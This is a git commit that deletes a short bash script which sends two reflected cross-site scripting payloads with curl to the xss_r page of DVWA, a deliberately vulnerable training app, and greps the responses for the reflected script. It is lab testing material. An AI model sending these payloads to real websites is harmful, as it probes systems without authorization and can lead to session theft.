4ecd11783d1a0d03cf0a7ce6af12880472ca375f
Incogn1toBro <griffen-0@hotmail.com>
2026-04-20 11:17:53 +1000

    Delete infra/attack-scripts/xss-attack.sh

--- infra/attack-scripts/xss-attack.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-TARGET="INSERT DVWA IP:8080"
-
-echo "=== XSS Attacks ==="
-curl -s "http://$TARGET/vulnerabilities/xss_r/?name=<script>alert(1)</script>" | grep -i script
-curl -s "http://$TARGET/vulnerabilities/xss_r/?name=javascript:alert(document.domain)" | grep -i java
